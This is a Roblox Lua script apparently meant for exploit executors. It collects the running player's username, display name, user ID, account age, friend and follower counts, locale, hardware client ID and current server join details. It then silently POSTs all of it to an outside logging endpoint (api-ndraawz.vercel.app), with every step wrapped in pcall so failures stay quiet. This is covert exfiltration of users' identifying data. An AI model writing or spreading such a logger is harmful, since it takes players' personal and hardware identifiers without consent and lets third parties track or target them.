local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalytics = game:GetService("RbxAnalyticsService")
local LocalizationService = game:GetService("LocalizationService")

local LocalPlayer = Players.LocalPlayer
local Name = LocalPlayer.Name
local DName = LocalPlayer.DisplayName
local UserId = LocalPlayer.UserId
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local CountryCode = LocalizationService.RobloxLocaleId

local GetHwid = "Not Supported"
pcall(function() GetHwid = RbxAnalytics:GetClientId() end)

local FriendsCount, FollowersCount, FollowingCount = "0", "0", "0"
pcall(function()
    FriendsCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/friends/count")).count
    FollowersCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followers/count")).count
    FollowingCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followings/count")).count
end)

local TotalDays = LocalPlayer.AccountAge
local Years = math.floor(TotalDays / 365)
local Months = math.floor((TotalDays % 365) / 30)
local AgeFormatted = string.format("%d Hari / %d Bulan / %d Tahun", TotalDays, Months, Years)

local MonthsList = {"Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"}
local DateTable = os.date("*t")
local ExecutedTime = string.format("%d %s %d | %02d:%02d:%02d", DateTable.day, MonthsList[DateTable.month], DateTable.year, DateTable.hour, DateTable.min, DateTable.sec)

local GameName = "Unknown"
pcall(function() GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
local JobId = game.JobId
local PlaceId = game.PlaceId
local PlayerCount = #Players:GetPlayers() .. "/" .. Players.MaxPlayers

local JoinCode = string.format("Roblox.GameLauncher.joinGameInstance(%d, '%s')", PlaceId, JobId)
local JoinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', PlaceId, JobId)

local function GetExecutor()
    if identifyexecutor then return identifyexecutor() end
    if syn then return "Synapse X" end
    return "Unknown"
end
local Executor = GetExecutor()

local fields = {
    { name = "━━━━━━━━━━━━━━ 📋 PLAYER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
    { name = "📛 Display Name", value = DName, inline = false },
    { name = "👤 Username", value = Name, inline = false },
    { name = "🆔 User ID", value = tostring(UserId), inline = false },
    { name = "💎 Membership", value = MembershipType, inline = false },
    { name = "🎂 Account Age", value = AgeFormatted, inline = false },
    { name = "👥 Friends/Followers/Following", value = FriendsCount.."/"..FollowersCount.."/"..FollowingCount, inline = false },
    { name = "🚩 Locale", value = CountryCode, inline = false },
    { name = "⚙️ Executor", value = Executor, inline = false },
    { name = "💻 HWID", value = GetHwid, inline = false },
    { name = "⏰ Executed Time", value = ExecutedTime, inline = false },
    { name = "━━━━━━━━━━━━━━ 🎮 SERVER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
    { name = "🎮 Game", value = GameName, inline = false },
    { name = "🆔 Place ID", value = tostring(PlaceId), inline = false },
    { name = "👥 Players", value = PlayerCount, inline = false },
    { name = "🔑 Job ID", value = JobId, inline = false },
    { name = "📜 Console Join", value = JoinCode, inline = false },
    { name = "📜 Executor Join", value = JoinScript, inline = false }
}

local requestFunc = (syn and syn.request) or (http_request) or (request) or (HttpPost)
if requestFunc then
    pcall(function()
        requestFunc({
            Url = "https://api-ndraawz.vercel.app/api/logger/log",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ 
                type = "player",
                fields = fields 
            })
        })
    end)
end
